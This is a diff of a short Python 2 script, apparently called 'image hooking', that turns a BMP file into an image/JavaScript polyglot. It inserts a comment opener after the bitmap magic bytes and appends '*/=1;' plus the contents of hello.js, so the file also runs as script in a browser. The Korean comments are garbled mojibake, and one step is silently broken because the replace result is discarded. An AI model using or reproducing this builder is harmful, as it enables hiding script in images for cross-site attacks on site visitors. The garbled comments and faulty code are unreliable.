@@ -2,26 +2,29 @@
 sFName = "img.bmp"
 sNewFName = "imgNew.bmp"
 
-# ÀÌÁø ÆÄÀÏ ÀÐ±â Àü¿ë ¸ðµå
+# ì´ì§„ íŒŒì¼ ì½ê¸° ì „ìš© ëª¨ë“œ
 sFile = open( sFName, "r+b" )
 sBuf = sFile.read()
-# ½ºÅ©¸³Æ® ½ÇÇà Áß ¿À·ù¸¦ ¹ß»ý½ÃÅ³ ¼ö ÀÖ´Â */ ¹®ÀÚ´Â °ø¹éÀ¸·Î Ä¡È¯
+# ìŠ¤í¬ë¦½íŠ¸ ì‹¤í–‰ ì¤‘ ì˜¤ë¥˜ë¥¼ ë°œìƒì‹œí‚¬ ìˆ˜ ìžˆëŠ” */ ë¬¸ìžëŠ” ê³µë°±ìœ¼ë¡œ ì¹˜í™˜
 sBuf.replace( b'\x2A\x2F', b'\x00\x00' )
 sFile.close()
 
 sFile = open( sNewFName, "w+b" )
 sFile.write( sBuf )
-# ÀÐ±â Ä¿¼­ ±âÁØÀ¸·Î µÚ·Î 2¹ÙÀÌÆ® ÀÌµ¿. Ã³À½ 2 ¹ÙÀÌÆ®´Â ºñÆ®¸Ê ÆÄÀÏÀ» ½Äº°ÇÏ´Âµ¥ »ç¿ëµÇ´Â ¸ÅÁ÷ ³Ñ¹ö
+# ì½ê¸° ì»¤ì„œ ê¸°ì¤€ìœ¼ë¡œ ë’¤ë¡œ 2ë°”ì´íŠ¸ ì´ë™. ì²˜ìŒ 2 ë°”ì´íŠ¸ëŠ” ë¹„íŠ¸ë§µ íŒŒì¼ì„ ì‹ë³„í•˜ëŠ”ë° ì‚¬ìš©ë˜ëŠ” ë§¤ì§ ë„˜ë²„
 sFile.seek( 2, 0 )
 '''
-ºñÆ®¸Ê ÆÄÀÏÀ» ½Äº°ÇÏ±â À§ÇØ »ç¿ëµÇ´Â ¸ÅÁ÷³Ñ¹ö µÚ¿¡ ÁÖ¼®¹®ÀÇ ½ÃÀÛÀ» ÀÇ¹ÌÈ÷³­ /* À» »ðÀÔ
-ºê¶ó¿ìÀú´Â ¸ÅÁ÷ ³Ñ¹ö¸¸ ÀÎ½ÄÇÏ¸é ³ª¸ÓÁö µ¥ÀÌÅÍ¿¡ ÀÏºÎ ¼Õ»óÀÌ ¹ß»ýÇÏ´õ¶óµµ ºñÆ®¸Ê ÆÄÀÏÀ»
-Á¤»óÀûÀ¸·Î ÀÐÀ» ¼ö ÀÖ´Ù.
+ë¹„íŠ¸ë§µ íŒŒì¼ì„ ì‹ë³„í•˜ê¸° ìœ„í•´ ì‚¬ìš©ë˜ëŠ” ë§¤ì§ë„˜ë²„ ë’¤ì— ì£¼ì„ë¬¸ì˜ ì‹œìž‘ì„ ì˜ë¯¸ížˆë‚œ /* ì„ ì‚½ìž…
+ë¸Œë¼ìš°ì €ëŠ” ë§¤ì§ ë„˜ë²„ë§Œ ì¸ì‹í•˜ë©´ ë‚˜ë¨¸ì§€ ë°ì´í„°ì— ì¼ë¶€ ì†ìƒì´ ë°œìƒí•˜ë”ë¼ë„ ë¹„íŠ¸ë§µ íŒŒì¼ì„
+ì •ìƒì ìœ¼ë¡œ ì½ì„ ìˆ˜ ìžˆë‹¤.
 '''
 sFile.write( b'\x2F\x2A' )
 sFile.close()
 
 sFile = open( sNewFName, "a+b" )
+#sFile.write( b'\x2F\x2A' )
 sFile.write( b'\xFF\x2A\x2F\x3D\x31\x3B' )
 sFile.write( open ( 'hello.js', 'rb' ).read() )
 sFile.close()
+
+print "image hooking complete"
